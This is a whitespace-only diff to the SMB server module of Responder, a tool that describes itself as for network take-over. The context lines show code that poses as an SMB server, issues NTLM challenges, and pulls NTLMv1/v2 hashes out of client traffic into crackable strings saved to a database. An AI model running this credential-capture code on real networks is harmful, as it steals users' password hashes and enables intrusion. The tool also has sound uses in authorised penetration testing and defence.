@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by the watchers.
 # email: providence@tao.oga
 # This program is free software: you can redistribute it and/or modify
@@ -108,11 +108,11 @@ def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge,'hex').decode('latin-1'))
 
 		SaveToDb({
-			'module': 'SMB', 
-			'type': 'NTLMv1-SSP', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': SMBHash, 
+			'module': 'SMB',
+			'type': 'NTLMv1-SSP',
+			'client': client,
+			'user': Domain+'\\'+Username,
+			'hash': SMBHash,
 			'fullhash': WriteHash,
 		})
 
@@ -128,11 +128,11 @@ def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
 
 		SaveToDb({
-			'module': 'SMB', 
-			'type': 'NTLMv2-SSP', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': SMBHash, 
+			'module': 'SMB',
+			'type': 'NTLMv2-SSP',
+			'client': client,
+			'user': Domain+'\\'+Username,
+			'hash': SMBHash,
 			'fullhash': WriteHash,
 		})
 
@@ -147,13 +147,13 @@ def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
 		LmHash = FullHash[:32].upper()
 		NtHash = FullHash[32:].upper()
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), LmHash.decode('latin-1'), NtHash.decode('latin-1'))
-	
+
 		SaveToDb({
-			'module': 'SMB', 
-			'type': 'NTLMv2', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': NtHash, 
+			'module': 'SMB',
+			'type': 'NTLMv2',
+			'client': client,
+			'user': Domain+'\\'+Username,
+			'hash': NtHash,
 			'fullhash': WriteHash,
 		})
 
@@ -162,11 +162,11 @@ def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
 		LmHash = codecs.encode(data[65:65+LMhashLen],'hex').upper()
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LmHash.decode('latin-1'), NtHash.decode('latin-1'), codecs.encode(Challenge,'hex').decode('latin-1'))
 		SaveToDb({
-			'module': 'SMB', 
-			'type': 'NTLMv1', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': NtHash, 
+			'module': 'SMB',
+			'type': 'NTLMv1',
+			'client': client,
+			'user': Domain+'\\'+Username,
+			'hash': NtHash,
 			'fullhash': WriteHash,
 		})
 
@@ -255,7 +255,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 					Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
 					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)))
 					Body.calculate()
-		
+
 					packet1 = str(Header)+str(Body)
 					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
 
@@ -264,7 +264,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 
 				if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
 					IsNT4ClearTxt(data, self.client_address[0])
-					
+
 					# STATUS_MORE_PROCESSING_REQUIRED
 					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",mid=midcalc(NetworkRecvBufferPython2or3(data)))
 					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
@@ -272,7 +272,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 					else:
 						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
 					Body.calculate()
-		
+
 					packet1 = str(Header)+str(Body)
 					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
 
@@ -316,7 +316,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 
 							self.request.send(NetworkSendBufferPython2or3(Buffer))
 							data = self.request.recv(1024)
-				
+
 
 				if data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
 					ParseShare(data)
